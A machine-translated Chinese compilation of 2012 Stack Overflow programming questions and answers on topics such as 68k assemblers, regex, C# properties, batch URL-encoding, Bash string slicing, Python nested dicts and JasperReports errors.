可以在 [hgrc](http://www.selenic.com/mercurial/hgrc.5.html#hooks)手册页上找到有关通用`pre-<command>`（和）钩子的完整详细信息。`post-<command>`

看起来`pushkey`钩子可能会做你想做的事，但`pre-bookmark`（或更好，`post-bookmark`）可能更直接。

# macos - OS X Lion 上的 68k 汇编器

> ID：10218442
> 
> 赞同：5
> 
> 时间：2012-04-18T21:39:12.560
> 
> 标签：macos, assembly, osx-lion, 68000

我需要在汇编程序中为我的大学课程做一些 68k 的编程工作。我正在寻找在 os x lion 上执行此操作的程序。我发现在 wine 中运行的 easy68k，但我觉得它不能正常工作。有什么猜测吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-26T01:08:08.200

[Vasm](http://sun.hasenbraten.de/vasm/)是一个可以针对 68k 构建并在 OS X 下工作的汇编程序。检查编译说明，但基本上使用 Motorola 语法从源代码构建它到目标 68k 的命令是：

```
make CPU=m68k SYNTAX=mot 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-03T23:02:52.467

我也遇到了同样的情况，我发现 Easy68k ( [http://www.easy68k.com/](http://www.easy68k.com/) ) 在 wine 下工作得很好。

此外，可以使用 Aranym 设置完整的 Debian/68k 系统（请参阅[https://wiki.debian.org/Aranym/Quick](https://wiki.debian.org/Aranym/Quick)）。

我会在我的博客上写一些关于这个的东西，希望它有帮助。

资料来源：也为大学课程学习 m68k。

## 干杯，

史努比

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-06-07T16:49:03.317

我遇到了 Mac 不再支持 32 位代码的问题。

所以我不得不构建[Dockers](https://www.docker.com/)。

[我](https://github.com/scirelli/M68k/blob/master/asm68k/Dockerfile)的例子。

```
FROM i386/alpine:latest

COPY ./resources/* /opt/asm68k/

RUN apk add --no-cache wine freetype ncurses && \
    mkdir -p /opt/asm68k/bin && \
    ln -s /opt/asm68k/asm68k.sh /opt/asm68k/bin/asm68k && \
    echo 'export PATH=$PATH:/opt/asm68k/bin' >> /etc/profile && \
    ln -s /opt/asm68k/bin/* /usr/local/bin/ && \
    echo alias ll='ls -lah' >> /etc/profile.d/aliases.sh && \
    wine --version && \
    wine /opt/asm68k/asm68k.exe || echo 'done'

WORKDIR "/tmp"

ENTRYPOINT ["wine", "/opt/asm68k/asm68k.exe"] 
```

我也以这种方式构建了[binutils](https://github.com/scirelli/M68k/tree/master/binutils)，但这很痛苦。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T04:15:42.937

可以构建GNU 汇编器（[binutils的一部分）以针对 m68k。](http://www.gnu.org/software/binutils/)使用 --target=m68k-elf 运行配置（因为 m68k 不再支持 COFF 输出）。如果您想用 C/C++ 编写一些代码，您还可以选择安装 gcc 和[newlib 。](http://sourceware.org/newlib/)

# javascript - 谷歌浏览器扩展搞乱了正则表达式全局标志

> ID：10218444
> 
> 赞同：1
> 
> 时间：2012-04-18T21:39:37.333
> 
> 标签：javascript, regex, google-chrome-extension

我做错了什么，还是谷歌浏览器的错？
使用非捕获组和捕获组与不使用它们的效果相同。

RegExr 显示第一个预期结果。[http://regexr.com?30mjo](http://regexr.com?30mjo)

```
var text = 'startdate: 123456, enddate: 789012';
var unix = text.match(/(?:start|end)date: (\d+)/g);
console.log(unix); 
```

**实际结果**

```
["startdate: 123456", "enddate: 789012"] 
```

**预期结果**

```
["123456", "789012"] or  
["startdate: 123456", "123456", "enddate: 789012", "789012"] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:14:34.880

看起来规范说它应该以这种方式工作。

相关线路是

`4\. Let matchStr be the result of calling the [[Get]] internal method of result with argument "0"`

[在ecmascript 规范的](http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf)第146 页上，`result`您从调用`exec`.

除了手动调用 exec 并像这样收集结果之外，我一直无法找到一种方法来完成这项工作：

```
var regex = /(?:start|end)date: (\d+)/g;
var text = 'startdate: 123456, enddate: 789012';

var result;
var unix = [];

while(result = regex.exec(text)){    
    unix.push(result[1]);
}

console.log(unix); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-18T21:59:09.753

你做错了什么。

那这个呢？

```
/((?:start|end)date: (\d+))/g 
```

# c# - C# 分配来自不同对象的变量

> ID：10218446
> 
> 赞同：3
> 
> 时间：2012-04-18T21:39:57.933
> 
> 标签：c#

我不太确定如何用 C# 术语提出我的问题，所以请耐心等待冗长的解释。

我正在写一个股票交易算法。当算法启动时，它会检查它适用于哪种工具（在这种情况下，股票或期货），然后根据工具，为“double x”分配一个值。

如果它是未来的工具，那么分配是一个简单的平面值（在这种情况下，“double x = 5;）。但是，如果它是股票，我希望将“x”分配给另一个值对象 - 让我们调用对象“Algo2”和值“y”。因此，在我的脚本中，赋值如下：“double x = Algo2.y”（注意：这是我正在使用的编辑器中的约定）。此代码块仅在算法开始时运行一次。

我在这里想要实现的是告诉我的算法在“EntryValue = Price + x”等公式中使用“x”时获取“Algo2.y”的最新值。然而，发生的事情是“x”在程序开始时被永久分配了“Algo2.y”的值，并且由于该块永远不会再次运行，因此始终保持该恒定值。

任何人都可以帮助使用语法，而不是为“x”分配一个值，它只是指向获取“Algo2.y”的最新值，无论它被调用吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:44:33.753

使“x”成为一个属性，以便每次请求 x 时它都会获取值。

```
class StockInstrument
{
  public double Value //x isn't a good name, I'll use "Value"
  {
    get
    {
      if(...) return 5.0;
      else return Algo2.y;
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:44:25.723

我会使用一种方法来返回您的最新值

```
public double GetXValue()
{
  if (AlgoType == Algos.Futures)
  {
    return 5.0;
  }
  else if (AlgoType == Algos.Stock)
  {
    return Algo2.y;
  }
  //else
  throw new Exception("unknown algo type");
} 
```

这是相当硬编码的，但可以使用委托和算法封装来清理它，但在低级别 - 这就是想法。此外，有些人更喜欢为此使用属性 - 只是在`get`具有修改影响时不要使用属性

```
public double X
{
  get
  {
    if (AlgoType == Algos.Futures)
    {
      return 5.0;
    }
    else if (AlgoType == Algos.Stock)
    {
      return Algo2.y;
    }
    //else
    throw new Exception("unknown algo type");
  }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T21:44:49.730

可以使用类似的东西：

```
double X {
  get { 
        if(isStock()) 
           return Algo2.y; 
        else 
           return 5;
  }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-18T21:44:53.663

为它写一个函数：

```
double getAlgo2YValue()
{
    return Algo2.y; // or Algo2.getY(), another function if you can't access it
} 
```

在您的主要算法中，现在调用：

```
x = getAlgo2YValue(); 
```

更新 X。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-18T21:47:58.607

```
Func<int> getX;

if(isFuture)
    getX = () => 5;
else
    getX = () => Algo.y;

// using getX() will always return the current value of Algo.y,
// in case it's a stock.
int xval = getX(); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-18T21:51:49.850

您需要的是一个属性包装器，用于`x`根据仪器类型控制返回的值。这是一个示例，它需要对您的应用程序进行一些重大调整。

```
public class Instrument
{
   // an example enum holding types
   public InstrumentType Type {get; set;}

   // x is not a great name, but following your question's convention...
   public double X
   {
      get
      {
         if(type == InstrumentType.Stock)
            return Algo2.y();
            // note that I changed this to be a method rather than a property
            // Algo2.y() should be static so it can be called without an instance
         else if(type == InstrumentType.Future)
            return 5.0;
         else 
            // return some default value here
      }
   }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-18T21:45:37.180

给 Algo2 一个对 Algo 的引用，这样就不需要“双 X”副本。然后，Algo 可以随时取消引用 Algo2 中的实际值（线程安全问题？）。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-04-18T21:45:39.637

值数据类型，例如*int*总是按值复制，而不是作为引用。但是，您可以做的是稍微不同地构建您的解决方案，然后它将提供正确的价值。例如：

```
 public class ValueContainer
 {
      protected Algo2 _reference = null;
      protected double _staticValue = 0;

      public double CurrentValue
      {
          get
          {
              if(_reference == null)
                 return _staticValue;

              return _reference.y;
          }
      }

      public ValueContainer(Algo2 reference)
      {
           _reference = reference;
      }

      public ValueContainer(double value)
      {
           _staticValue = value;
      }
 } 
```

`x`然后，在需要的地方用`ValueContainer`实例替换你的，并使用`CurrentValue`属性来获取值。然后使用不同的构造函数创建每个版本：

```
 ValueContainer container = null;

 if(stock)
    container = new ValueContainer(5);
 else
    container = new ValueContainer(Algo2); 
```

# batch-file - 如何对 NT 批处理文件中的空格进行 URL 编码？

> ID：10218451
> 
> 赞同：4
> 
> 时间：2012-04-18T21:40:39.373
> 
> 标签：batch-file

我不幸使用了一个程序，该程序要求传递给它的所有文件名都是有效的 URL。（不，我不知道为什么。）我不必`file:`每次都拖放到命令行和手工制作 URL，而是将一个批处理文件放在一起，我可以简单地将文件从 Windows GUI 拖放到该批处理文件上。

一个完整的、正确的 URL 编码器超出了我的需要或兴趣（无论如何，应用程序阻塞的大多数字符在 Windows 文件名中都无效），但我需要解决的两种情况是反斜杠和空格。反斜杠很容易通过变量替换语法 ( `SET URL=%URL:\=/%`) 处理，但空格很棘手——`%`对于 URL 和批处理文件来说都是特殊的。

我熟悉的两种类型的批处理转义 ( `^%`, `%%`) 都不允许变量替换按预期运行，而且我在谷歌搜索解决方案方面没有任何成功。任何批次大师可以帮助我吗？

这是我到目前为止所拥有的：

```
@ECHO OFF

SETLOCAL

SET URLPATH=file:/%~dp1
SET URLPATH=%URLPATH:\=/%

REM none of these work
REM SET URLPATH=%URLPATH: =%20%
REM SET URLPATH=%URLPATH: =%%20%
REM SET URLPATH=%URLPATH: =^%20%

REM works; I just need to figure out how to generate it
SET URLPATH=file:/C:/Documents%%20and%%20Settings/bblank/example.dat

stupidapp.exe %URLPATH%

ENDLOCAL 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:42:27.883

旁注 - 我相信你想要`%~f1`而不是`%~dp1`

您需要切换到延迟扩展。

```
@echo off
setlocal enableDelayedExpansion

set "URLPATH=file:/%~f1"
set "URLPATH=!URLPATH:\=/!"
set "URLPATH=!URLPATH: =%%20!"
stupidapp.exe !URLPATH!

endlocal 
```

如果您的任何文件名碰巧包含该字符，则需要做更多的工作，`!`因为如果启用了延迟扩展，则在扩展 %1 时它将被损坏。

```
@echo off
setlocal disableDelayedExpansion
set "URLPATH=file:/%~f1"
setlocal enableDelayedExpansion
set "URLPATH=!URLPATH:\=/!"
set "URLPATH=!URLPATH: =%%20!"
stupidapp.exe !URLPATH!

endlocal
endlocal 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T00:01:44.673

dbenham 的解决方案几乎肯定更可取（更容易阅读），但为了完整起见，这里有一个替代解决方案：

```
SET URLPATH=file:/%~dp1
SET URLPATH=%URLPATH:\=/%

REM for each space in the path, split the path into the portions before and after
REM that space, then join them with an escaped space
:ESCAPE_SPACE
SET TRAILING=%URLPATH:* =%
CALL SET URLPATH=%%URLPATH: %TRAILING%=%%
SET URLPATH=%URLPATH%%%20%TRAILING%
IF NOT "%URLPATH%"=="%URLPATH: =%" GOTO ESCAPE_SPACE

stupidapp.exe %URLPATH% 
```

# grails - 将 Gradle 模块和 Grails 模块捆绑在一起的最佳方式

> ID：10218466
> 
> 赞同：0
> 
> 时间：2012-04-18T21:41:58.427
> 
> 标签：grails, gradle

我们有一个包含 2 个模块的项目；网络和客户端

Web 模块是一个 Grails 应用程序，而客户端模块大多只是 groovy 代码和一些 Java 代码。客户端模块由 Gradle 构建脚本管理。

Grails 模块在客户端模块中有依赖关系。在 IntelliJ 中，我可以在模块配置中毫无问题地定义它。但是，在构建 Grails WAR 时，我确实需要构建客户端 JAR 并将其放在 WAR 文件中。我想知道最好的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:41:00.440

这就是我最终要做的。

在我的 Gradle 脚本中，我有以下内容：

```
repositories {
  mavenCentral()
  flatDir {
    name "genRocketRepos"
    dirs "${System.properties['user.home']}/.genRocket/repos"
  }
}

uploadArchives {
  repositories {
    add project.repositories.genRocketRepos
  }
} 
```

然后我通过 Gradle 运行 uploadArchives 任务。这会将 JAR 文件发布到本地存储库。在 Grails BuildConfig.groovy 中，我定义了以下内容：

```
repositories {
  ...
  flatDir name:'myRepo', dirs:'${userHome}/.genRocket/repo'
}

dependencies {
  ...
  runtime 'genRocket:client:1.0'
} 
```

Now Grails sees the dependency and includes in the classpath as well as places the JAR in the WAR for me.

# java - LWJGL (JAVA) 中的 OpenGL 多线程

> ID：10218473
> 
> 赞同：1
> 
> 时间：2012-04-18T21:42:37.400
> 
> 标签：java, multithreading, lwjgl

在游戏开始时我正在加载模型和东西，这需要一些时间，因此在加载时会有一个空白的黑屏。

所以我想做的是将所有模型加载和显示列表创建放在一个线程中，并在另一个线程中进行（渲染）一些加载。现在我了解到 OpenGL 不能很好地处理多线程，并且只能从一个线程调用 OpenGL 命令，我的原始线程解决方案不起作用。两个线程都应该能够调用 OpenGL 命令：渲染和显示列表创建。

有谁知道（熟悉）一个简单的解决方案？与示例的良好链接就可以了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:54:24.923

您必须记住解释 GL 命令的模型是客户端-服务器。也就是说，程序（客户端）发出命令，这些命令由 GL（服务器）解释和处理 - （取自规范）。

因此，您可以轻松地从两个线程发送命令 - 这没问题。但是，如果您不知道自己在做什么，那么通过使用多线程，您将打开一个巨大的潜在蠕虫罐。

加载时，我会制作一个加载屏幕并在加载一些资源时对其进行更新。并非所有事情都需要一个超级完美的解决方案——尤其是这样的小事:)

# bash - 如何获取 Bash 变量中的第一个字母？

> ID：10218474
> 
> 赞同：96
> 
> 时间：2012-04-18T21:42:39.240
> 
> 标签：bash, text-processing, variable-expansion

我有一个 Bash 变量 ，`$word`它有时是一个单词或句子，例如：

```
word="tiger" 
```

或者：

```
word="This is a sentence." 
```

如何创建一个新的 Bash 变量，该变量仅等于变量中的第一个字母？例如，上面将是：

```
echo $firstletter
t 
```

或者：

```
echo $firstletter
T 
```

* * *

## 回答 #1

> 赞同：319
> 
> 时间：2012-04-18T21:46:10.650

```
word="tiger"
firstletter=${word:0:1} 
```

* * *

## 回答 #2

> 赞同：78
> 
> 时间：2012-04-18T22:03:07.510

```
word=something
first=${word::1} 
```

* * *

## 回答 #3

> 赞同：43
> 
> 时间：2012-04-18T21:44:00.690

```
initial="$(echo $word | head -c 1)" 
```

每次您在问题描述中说“第一”时，`head`都是一个可能的解决方案。

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2017-07-08T16:45:24.547

一种可移植的方法是使用[参数扩展（这是 POSIX 功能）](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_02)：

```
$ word='tiger'
$ echo "${word%"${word#?}"}"
t 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2018-08-30T14:59:25.437

带切：

```
word='tiger'
echo "${word}" | cut -c 1 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-03-01T18:00:16.857

既然你有一个`sed`标签，这是一个`sed`答案：

```
echo "$word" | sed -e "{ s/^\(.\).*/\1/ ; q }" 
```

为那些喜欢这些的人玩玩玩（我愿意！）：

`{`

*   `s`: 开始一个替换例程
    *   `/`: 开始指定要替换的内容
    *   `^\(.\)`：捕获第 1 组中的第一个字符
    *   `.*`:, 确保该行的其余部分将在替换中
    *   `/`: 开始指定替换
    *   `\1`: 插入组 1
    *   `/`: 其余的被丢弃`;`
*   `q`：退出`sed`，因此如果有其他行，它将不会重复此块。

`}`

那很有趣！`:)`您也可以使用`grep`等，但如果您使用`bash`魔法`${x:0:1}`仍然是 imo 更好的解决方案。（我花了大约一个小时试图使用 POSIX 变量扩展来做到这一点，但不能`:(` ）

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-10-22T05:40:42.167

使用 bash 4：

```
x="test"
read -N 1 var <<< "${x}"
echo "${var}" 
```

# c++ - 如何将 JPEG 转换为 DCT 8 x 8？

> ID：10218475
> 
> 赞同：0
> 
> 时间：2012-04-18T21:42:42.210
> 
> 标签：c++, opencv, jpeg, dct

如何使用 OpenCv 和 C++ 将 JPEG 图像转换为 DCT 8x8？就像我从哪里开始一样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T12:38:06.227

[libjpeg](http://en.wikipedia.org/wiki/Libjpeg)是你的朋友...

以下代码片段从 JPEG 图像中加载 DCT 系数（免责声明：它是从我的一个四年前的项目 - YMMV 中提取的）：

```
struct jpeg_decompress_struct srcinfo;
struct jpeg_error_mgr jsrcerr;
jvirt_barray_ptr * src_coef_arrays;
FILE * fp;  

srcinfo.err = jpeg_std_error(&jsrcerr);
jpeg_create_decompress(&srcinfo);
fp = fopen(filename, "rb");
jpeg_stdio_src(&srcinfo, fp);
(void) jpeg_read_header(&srcinfo, TRUE);
src_coef_arrays = jpeg_read_coefficients(&srcinfo);
fclose(fp);

...
// use coefficients
...

(void) jpeg_finish_decompress(&srcinfo);
jpeg_destroy_decompress(&srcinfo); 
```

访问系数有点麻烦 - 我建议您查阅与 libjpeg 捆绑在一起的 jpegtran 实用程序的源代码，看看它是如何完成的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:59:25.223

我认为您要完成的工作没有多大意义。JPEG 图像已经充满了 DCT。您需要先了解您要做什么，OpenCV+C++ 只会让事情变得更混乱

# jquery - 使用 jQuery 从 iFrame 访问 parent.document，在 IE 中获取“访问被拒绝”？

> ID：10218476
> 
> 赞同：2
> 
> 时间：2012-04-18T21:42:42.973
> 
> 标签：jquery, iframe, parent

我有一个创建 iFrame 并加载内容的父文档。

我在 iframe 文档上使用 jQuery 来访问父文档上的元素并更改它们的样式，就像这样

```
popBox = $('#slideshow_popOutBox', parent.document);
$(popBox).css({'border':'none','background':'transparent'}); 
```

在我的开发服务器上，这适用于我测试过的所有浏览器（IE 7-9、FF 3.6-11、Chrome、Safari）

当客户端将它放在他们的服务器上时，它在 IE 中失败并显示“访问被拒绝”。它失败的那一行是

```
popBox = $('#slideshow_popOutBox', parent.document); 
```

Chrome 失败了，但实际上输出了一些更有用的东西：

```
Unsafe JavaScript attempt to access frame with URL http://www.domain.com/default_PrestitialAd.asp from frame with URL http://www.domain.com/ads/Prestitial/index.html. Domains, protocols and ports must match. 
```

域和协议匹配。我正在与客户核实有关端口的信息。

我真正想知道的是父级上是否有一些 javascript 阻止 iframe 访问其任何元素。有没有办法做到这一点？

# java - 来自源和前缀的合并列表

> ID：10218481
> 
> 赞同：0
> 
> 时间：2012-04-18T21:43:19.940
> 
> 标签：java

我在学校遇到过以下问题，我已经根据我的理解解决了，解决方案如下。有人可以帮我提供一个更好的解决方案吗？

问题：

> 生成一个软件应用程序，该应用程序创建两个不区分大小写的排序列表的过滤合并。第一个输入列表被指定为源列表，另一个为前缀列表。应用程序将使用以下算法生成一个合并列表，其中包含来自 Source 和 Prefixes 列表的项目：
> 
> 当且仅当满足以下条件之一时，项目 X 才在合并列表中：
> 
> a) X 来自 Source 列表，并且 Prefixes 列表中有一个项目 Y，它是 X 的不区分大小写的字符串前缀。
> 
> b) X 来自 Prefixes 列表，并且 Source 列表中没有 X 是不区分大小写的字符串前缀的项目。
> 
> 完成的合并列表应与原始两个列表中的项目具有相同的排序顺序。

我的解决方案：

```
public ArrayList<String> merge(List<String> srcList, List<String> preList) {
        // If Prefixes list is empty then there cannot be a new merge list
        if (preList.isEmpty()) {
            return null;
        }
        int i = 0, j = 0;
        int sourcesListSize = srcList.size();
        int prefixesListSize = preList.size();
        ArrayList<String> mergeList = new ArrayList<String>();
        // Loop through Sources list until end of the list is reached
        //ASSUMPTION: Both SourceList and PrefixList are already sorted.
        while (i < sourcesListSize && j<prefixesListSize) {
            mergeList.add(preList.get(j).concat(srcList.get(i)));
            i++;
            j++;
        }
        // If Prefixes list still have items, then add it to mergeList
        while (j < prefixesListSize) {
            mergeList.add(preList.get(j));
            j++;
        }
        return mergeList;

    } 
```

输入：

*   来源清单：`{"pple","ow","enver",pic,"ull"}`
*   前缀列表：`{"a","c","d","e","f"}`

`MergeList={"apple",cow","denver","epic","full"}`

我的理解正确吗？有没有其他最好的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T05:15:51.897

由于这是家庭作业，我会尽量不提供太多内容，但根据[prefix](http://en.wikipedia.org/wiki/Substring#Prefix)的定义，这里有一些示例：

> “a”是“Apple”的前缀
> 
> “牛”是“牛”的前缀
> 
> “g”**不是**“Zoo”的前缀
> 
> “col”**不是**“cool”的前缀

基于此，MergeList 将用于以下内容吗？提示：在正确的 MergeList 中会有 SourceList 和 PrefixList 中的项目。发布您的解决方案，我会批评它。一旦您了解了这部分的工作原理，您就会更好地了解如何编写解决方案。

> SourceList : {"Apple","Pepper","Denver", "Garage", "Zoo"}
> 
> 前缀列表：{"a","d","pe","xylophone","e"}

# jquery - jQuery 验证插件和错误放置问题

> ID：10218483
> 
> 赞同：0
> 
> 时间：2012-04-18T21:43:21.907
> 
> 标签：jquery, jquery-validate

我目前正在使用可以在以下位置找到的 jquery 验证插件：http: [//bassistance.de/jquery-plugins/jquery-plugin-validation/](http://bassistance.de/jquery-plugins/jquery-plugin-validation/)。我一直在搜索谷歌并且在弄清楚如何使错误出现在触发提交错误的文本框中时遇到问题。如果可以以更简单的方式实现此结果，我愿意使用不同的插件。

任何帮助将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T23:01:25.313

我认为您需要调用错误放置功能：

```
    $("#form_id").validate({
        rules: {
            field: { required: true, email: true }
        },
        messages: {
            field: { required: "" , email: ""}
        },
        errorPlacement: function (error, element) {
            if (element.attr("id") == "field_id") {
                $('#target_error_placement_id').html(error);
            }
         }
    }); 

```

那是你的问题吗？

# c# - HttpWebRequest 在明显成功登录后总是无法接收到 HTTP 302 代码

> ID：10218485
> 
> 赞同：0
> 
> 时间：2012-04-18T21:43:35.530
> 
> 标签：c#, redirect, .net-4.0, https, httpwebrequest

我对以下用例有一个令人费解的情况。

1.  用户使用 SSL 登录到 apache 服务器
2.  阿帕奇发回->
    *   header("上下文类型：纯文本");
    *   echo "发送请求";
3.  用户使用 httpwebrequest 从 c#/.net 提交新请求以获取数据
4.  apache以json形式发回数据
5.  拥有所需数据并乐于继续的用户

* * *

我把上面的场景放在 c#/form.timer 中；并且大多数时候它在后台运行平稳，没有噪音。但是，一段时间后（通常是几个小时），第 3 步）失败，总是重定向到登录页面（http 状态 302）。

Apache 服务器和 php 已经过时了（apache 2.2.10 和 php 5.2.xx）。

在 c# 中，httpwebrequest 的设置如下面的代码片段所示。

```
System.Net.ServicePointManager.Expect100Continue = false;
lrequest = (HttpWebRequest)WebRequest.Create(tmp_url);
lrequest.CookieContainer = ThisAddIn.getCookieContainer();
lrequest.KeepAlive = true;
lrequest.AllowAutoRedirect = false;
lrequest.Method = "POST";
lrequest.ContentType = "application/x-www-form-urlencoded";
lrequest.UserAgent = "Mozilla/4.0 (compatible; MSIE 9.0; MSIE 8.0; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAU; InfoPath.2; .NET CLR 1.1.4322; MS-RTC LM 8; .NET4.0C; .NET4.0E; OfficeLiveConnector.1.5; OfficeLivePatch.1.3)";
int tmp_len = dbyte.Length;
lrequest.ContentLength = tmp_len;
Stream dstream = lrequest.GetRequestStream();
dstream.Write = (dbyte,0,tmp_len);
dstream.Close();
lresponse = (HttpWebResponse)lrequest.GetResponse();
dstream = lresponse.GetResponseStream();
reader = new StreamReader(dstream);
rdata = reader.ReadToEnd();
reader.Close();
dstream.Close();
lresponse.Close(); 
```

# python - 设置嵌套字典值并创建中间键

> ID：10218486
> 
> 赞同：10
> 
> 时间：2012-04-18T21:43:35.557
> 
> 标签：python, dictionary

我觉得我最近看到了一种方法。假设我有一个空字典，我想在该空字典内的嵌套字典中设置一个值，但显然该嵌套字典尚未创建。是否有一种单行方式来创建中间键？这就是我想要做的：

```
mydict = {}
mydict['foo']['bar']['foobar'] = 25 
```

如果您执行此代码，您将获得 'foo' 的 KeyError 异常。是否有创建中间键的功能？

谢谢。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-04-18T21:45:20.943

```
from collections import defaultdict
recursivedict = lambda: defaultdict(recursivedict)
mydict = recursivedict() 
```

当你访问`mydict['foo']`时，它设置`mydict['foo']`为另一个`recursivedict`。它实际上也会构造一个`recursivedict`for `mydict['foo']['bar']['foobar']`，但随后将它分配给`25`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-18T21:57:02.047

另一种选择 - 根据您的用途，是使用元组作为键而不是嵌套字典：

```
mydict = {}
mydict['foo', 'bar', 'foobar'] = 25 
```

除非您想在任何时候获得树的分支（在这种情况下您无法获得 mydict['foo']），否则这将非常有效。

如果你知道你想要多少层嵌套，你也可以用[`functools.partial`](http://docs.python.org/py3k/library/functools.html#functools.partial)lambda 代替。

```
from functools import partial
from collections import defaultdict

tripledict = partial(defaultdict, partial(defaultdict, dict))
mydict = tripledict()
mydict['foo']['bar']['foobar'] = 25 
```

有些人发现它比等效的基于 lambda 的解决方案更具可读性，并且创建实例的速度更快：

```
python -m timeit -s "from functools import partial" -s "from collections import defaultdict" -s "tripledefaultdict = partial(defaultdict, partial(defaultdict, dict))" "tripledefaultdict()"
1000000 loops, best of 3: 0.281 usec per loop

python -m timeit -s "from collections import defaultdict" -s "recursivedict = lambda: defaultdict(recursivedict)" "recursivedict()"
1000000 loops, best of 3: 0.446 usec per loop 
```

尽管与往常一样，在您知道存在瓶颈之前进行优化是没有意义的，所以在最快的之前选择最有用和可读的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:48:02.737

不知道你为什么想要，但是：

```
>>> from collections import defaultdict as dd
>>> mydict = dd(lambda: dd(lambda: {}))
>>> mydict['foo']['bar']['foobar'] = 25
>>> mydict
defaultdict(<function <lambda> at 0x021B8978>, {'foo': defaultdict(<function <lambda> at 0x021B8618>, {'bar': {'foobar': 25}})}) 
```

# jasper-reports - 主报表中的子报表 - iReport4.5.1 和 JasperReport 4.5

> ID：10218491
> 
> 赞同：-1
> 
> 时间：2012-04-18T21:43:50.743
> 
> 标签：jasper-reports, ireport, jasperserver

我使用`iReport 4.5.1`带有 2 个子报表的设计器设计了一个报表，并且两个子报表都从父报表中获取参数。`iReport`从设计器执行时，报告工作正常。执行部署在中的报告时，我收到以下错误消息`JasperReports Server 4.5`：

```
net.sf.jasperreports.engine.JRRuntimeException: Error loading object from : repo:SUB_REPORT_NAME

Error Trace
net.sf.jasperreports.engine.JRRuntimeException: Error loading object from : repo:SUB_REPORT_NAME 
at net.sf.jasperreports.repo.DefaultRepositoryService.loadObject(DefaultRepositoryService.java:207) 
at net.sf.jasperreports.repo.DefaultRepositoryService.getResource(DefaultRepositoryService.java:168) 
at net.sf.jasperreports.repo.RepositoryUtil.getResource(RepositoryUtil.java:146) 
at net.sf.jasperreports.repo.RepositoryUtil.getReport(RepositoryUtil.java:126) 
at net.sf.jasperreports.engine.fill.JRFillSubreport.evaluateReport(JRFillSubreport.java:317) 
at net.sf.jasperreports.engine.fill.JRFillSubreport.evaluateSubreport(JRFillSubreport.java:347) 
at net.sf.jasperreports.engine.fill.JRFillSubreport.evaluate(JRFillSubreport.java:275) 
at net.sf.jasperreports.engine.fill.JRFillElementContainer.evaluate(JRFillElementContainer.java:257) 
at net.sf.jasperreports.engine.fill.JRFillBand.evaluate(JRFillBand.java:473) 
at net.sf.jasperreports.engine.fill.JRVerticalFiller.fillSummaryNoLastFooterSamePage(JRVerticalFiller.java:1067) 
at net.sf.jasperreports.engine.fill.JRVerticalFiller.fillSummary(JRVerticalFiller.java:1032) 
at net.sf.jasperreports.engine.fill.JRVerticalFiller.fillReportEnd(JRVerticalFiller.java:296) 
at net.sf.jasperreports.engine.fill.JRVerticalFiller.fillReport(JRVerticalFiller.java:135) 
at net.sf.jasperreports.engine.fill.JRBaseFiller.fill(JRBaseFiller.java:836) 
at net.sf.jasperreports.engine.fill.JRFiller.fillReport(JRFiller.java:118) 
at net.sf.jasperreports.engine.JasperFillManager.fillReport(JasperFillManager.java:435) 
at com.jaspersoft.jasperserver.api.engine.jasperreports.service.impl.EngineServiceImpl.fillReport(EngineServiceImpl.java:773) 
at com.jaspersoft.jasperserver.api.engine.jasperreports.service.impl.EngineServiceImpl.fillReport(EngineServiceImpl.java:731) 
at com.jaspersoft.jasperserver.api.engine.jasperreports.service.impl.EngineServiceImpl.fillReport(EngineServiceImpl.java:389) 
at com.jaspersoft.jasperserver.api.engine.jasperreports.service.impl.EngineServiceImpl.executeReport(EngineServiceImpl.java:890) 
at com.jaspersoft.jasperserver.api.engine.jasperreports.domain.impl.ReportUnitRequest.execute(ReportUnitRequest.java:57) 
at com.jaspersoft.jasperserver.api.engine.jasperreports.service.impl.EngineServiceImpl.execute(EngineServiceImpl.java:320) 
at com.jaspersoft.jasperserver.war.action.ViewReportAction.executeReport(ViewReportAction.java:499) 
at com.jaspersoft.jasperserver.war.action.ViewReportAction.executeReport(ViewReportAction.java:489) 
at com.jaspersoft.jasperserver.war.action.ViewReportAction.runReport(ViewReportAction.java:322) 
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) 
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 
at java.lang.reflect.Method.invoke(Method.java:597) 
